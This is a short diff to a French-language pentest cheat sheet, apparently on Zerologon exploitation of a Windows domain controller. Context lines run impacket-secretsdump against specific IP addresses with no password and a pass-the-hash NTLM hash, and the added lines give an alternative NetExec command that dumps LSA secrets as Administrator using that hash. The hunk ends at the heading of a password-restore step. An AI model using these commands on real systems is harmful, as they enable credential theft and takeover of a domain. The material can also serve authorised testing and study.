@@ -46,6 +46,13 @@ sudo impacket-secretsdump 'DC-ZEROLOGON$'@163.172.195.64 -just-dc -no-pass -user
 sudo impacket-secretsdump -hashes :777b1935ff37faba2b2c299288b0693b Administrator@212.129.29.187 -remoteSS-remote-volume c:\ -no-pass
 ```
 
+ou dump lsa
+
+```bash
+nxc smb <ip> -u Administrator -H 777b1935ff37faba2b2c299288b0693b --lsa
+```
+
+
 2. Restaurer mot de passe à l'aide du Hex
 
 ```bash
